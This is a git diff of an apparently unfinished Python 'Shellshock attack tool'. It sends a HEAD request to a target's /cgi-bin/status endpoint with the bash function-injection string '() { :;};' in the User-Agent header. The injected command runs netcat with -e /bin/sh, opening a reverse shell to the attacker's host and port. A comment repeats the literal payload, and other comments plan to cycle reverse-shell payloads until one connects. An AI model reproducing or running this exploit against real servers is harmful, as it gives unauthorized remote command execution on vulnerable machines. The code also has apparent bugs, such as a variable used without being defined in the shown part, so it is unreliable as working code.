@@ -5,15 +5,8 @@ import socket
 # Consists of the HEAD request which is sent in addition to the custom headers
 def shellshock_http_req(lhost, lport, rhost, rport, target_url):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-   s.connect((rhost, rport))
-   
-
-   '''
-   This technique might work
-   n = 5
-   s = str(n).encode()
-   '''
+   # Connet to this socket 
+   sock_connect = s.connect((rhost, rport))
 
    ''' HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" '''
    # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string
@@ -23,12 +16,13 @@ def shellshock_http_req(lhost, lport, rhost, rport, target_url):
    #s.sendall(b"GET / HTTP1.1\r\nHost: 192.168.0.100\r\n\r\n")
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost)
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost_encoded)
-   # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argument
+   # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argumento
    payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
    recv_data = s.recv(4096)
+   '''
+   Need a way to find out if the socket connected successfully or not and then inform the user
+   '''
    s.close()
-
-   return 
 
 ''' Paste in the URL from the shellshock_dect tool '''
 def shellshock_rev_payloads(lhost, lport, target_url):
@@ -50,30 +44,30 @@ def shellshock_rev_payloads(lhost, lport, target_url):
 
 def main():
     lhost = sys.argv[1]
-    lport = sys.argv[2]
+    lport = int(sys.argv[2])
     ''' We get this URL from the shellshock_dect tool '''
     target_url = sys.argv[3]
     print("Shellshock attack tool")
-
-    payload = shellshock_http_req('192.168.0.102',2222,'192.168.0.100', 80, target_url)
     print("Sending payload")
-    print("Payload received {}".format(payload))
+    # This is what we pass into the HEAD request which actually performs shellshock
+    payload = shellshock_http_req(lhost,lport,'192.168.0.100', 80, target_url)
+    print(payload)
 
 
     #Just a GET request ATM. Needs to have a socket attached
     #result = shellshock_rev_payloads(lhost, lport, target_url)
     #for rev_payload in result:
-        ''' 
-        The payloads should cycle from 1 - ... here until one payload connects back to us 
-        Create sockets back to us which contain the payloads
-        '''
+    ''' 
+    The payloads should cycle from 1 - ... here until one payload connects back to us 
+    Create sockets back to us which contain the payloads
+    '''
 
-        ''' 
-        Get all the rev shells to send in a get request
-        '''
+    ''' 
+    Get all the rev shells to send in a get request
+     '''
 
     #    print("Reverse shell payload(s): {}".format(rev_payload))
-        '''
-        rev_sock.connect(lhost, lport) - This will create a socket and then send the payload to target and then we get shell (Reverse shell payload)
+    '''
+    rev_sock.connect(lhost, lport) - This will create a socket and then send the payload to target and then we get shell (Reverse shell payload)
     '''
 main()
